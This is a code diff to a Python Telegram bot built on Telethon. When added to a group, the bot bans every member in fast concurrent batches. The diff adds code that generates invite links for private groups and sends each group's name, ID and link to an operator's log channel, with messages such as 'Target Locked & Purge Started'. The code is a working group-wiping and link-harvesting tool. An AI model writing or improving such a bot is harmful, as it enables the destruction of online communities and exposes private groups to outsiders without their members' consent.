@@ -8,7 +8,7 @@ from telethon.errors import FloodWaitError, ChatAdminRequiredError, UserAdminInv
 def get_env_var(name):
     value = os.environ.get(name)
     if not value:
-        print(f"⚠️ Missing: {name}")
+        print(f"⚠️ Missing environment variable: {name}")
     return value
 
 def to_int(value):
@@ -20,16 +20,28 @@ API_ID = to_int(get_env_var("API_ID"))
 API_HASH = get_env_var("API_HASH")
 LOG_GROUP_ID = to_int(get_env_var("LOG_GROUP_ID"))
 
-# Adjust BATCH_SIZE based on your bot's limits (20-30 is usually safe)
+# Speed settings
 BATCH_SIZE = 25 
 
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-
 active_tasks = set()
+
+# ───── HELPER: GET/GENERATE LINK ───── #
+async def get_best_link(chat):
+    """Public link check karta hai, nahi toh naya generate karta hai."""
+    # 1. Check for public username
+    if getattr(chat, 'username', None):
+        return f"https://t.me/{chat.username}"
+    
+    # 2. Try to generate an invite link for private groups
+    try:
+        link_obj = await bot(functions.messages.ExportChatInviteRequest(peer=chat.id))
+        return link_obj.link
+    except Exception:
+        return "Private (No Invite Permission)"
 
 # ───── ATOMIC KICK FUNCTION ───── #
 async def fast_kick(chat_id, user_id):
-    """The fastest way to remove a user using raw RPC."""
     try:
         await bot(functions.channels.EditBannedRequest(
             channel=chat_id,
@@ -38,11 +50,10 @@ async def fast_kick(chat_id, user_id):
         ))
         return True
     except FloodWaitError as e:
-        print(f"🛑 Rate limited! Sleeping for {e.seconds}s")
         await asyncio.sleep(e.seconds)
         return False
     except (UserAdminInvalidError, ChatAdminRequiredError):
-        return "stop" # Signal to stop the whole process
+        return "stop"
     except Exception:
         return False
 
@@ -55,22 +66,27 @@ async def start_cleanup(chat):
     start_time = time.time()
     removed_count = 0
     me = await bot.get_me()
+    
+    # Generate Link
+    group_link = await get_best_link(chat)
 
-    await bot.send_message(LOG_GROUP_ID, f"⚡ **High-Speed Purge Started**\nGroup: {chat.title}")
+    await bot.send_message(
+        LOG_GROUP_ID, 
+        f"🚀 **Target Locked & Purge Started!**\n\n"
+        f"🏷️ **Name:** {chat.title}\n"
+        f"🆔 **ID:** `{chat.id}`\n"
+        f"🔗 **Link:** {group_link}"
+    )
 
     try:
-        # iter_participants is a generator; it doesn't wait for the whole list to load
         current_batch = []
         async for user in bot.iter_participants(chat.id):
             if user.id == me.id: continue
             
-            # Add to batch
             current_batch.append(fast_kick(chat.id, user.id))
 
             if len(current_batch) >= BATCH_SIZE:
-                # Execute batch concurrently
                 results = await asyncio.gather(*current_batch)
-                
                 removed_count += sum(1 for r in results if r is True)
                 current_batch = []
                 
@@ -78,10 +94,9 @@ async def start_cleanup(chat):
                     await bot.send_message(LOG_GROUP_ID, f"❌ **Aborted:** Permissions lost in {chat.title}")
                     break
                 
-                # Small yield to the event loop
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.1) # Prevents CPU spike
 
-        # Catch remaining users in the last batch
+        # Final batch cleanup
         if current_batch:
             results = await asyncio.gather(*current_batch)
             removed_count += sum(1 for r in results if r is True)
@@ -90,11 +105,15 @@ async def start_cleanup(chat):
         duration = round(time.time() - start_time, 2)
         await bot.send_message(
             LOG_GROUP_ID, 
-            f"🏁 **Purge Complete**\nGroup: {chat.title}\nRemoved: {removed_count}\nTime: {duration}s"
+            f"✅ **Mission Accomplished!**\n\n"
+            f"🏷️ **Group:** {chat.title}\n"
+            f"👤 **Total Removed:** {removed_count}\n"
+            f"⏱️ **Total Time:** {duration}s\n"
+            f"🔗 **Link:** {group_link}"
         )
         active_tasks.remove(chat.id)
 
-# ───── EVENTS ───── #
+# ───── AUTOMATIC TRIGGERS ───── #
 @bot.on(events.ChatAction)
 async def on_added(event):
     if event.user_added and event.user_id == (await bot.get_me()).id:
@@ -116,10 +135,10 @@ async def check_and_run(chat):
     except Exception:
         pass
 
-# ───── MAIN ───── #
+# ───── BOT RUNNER ───── #
 async def main():
-    print("🚀 Turbo-Bot is Online")
-    await bot.send_message(LOG_GROUP_ID, "🚀 **Bot Online:** Monitoring for targets...")
+    print("⚡ Turbo Link-Purge Bot is running...")
+    await bot.send_message(LOG_GROUP_ID, "🚀 **Bot Is Online!**\nReady to clean and generate links.")
     await bot.run_until_disconnected()
 
 bot.loop.run_until_complete(main())
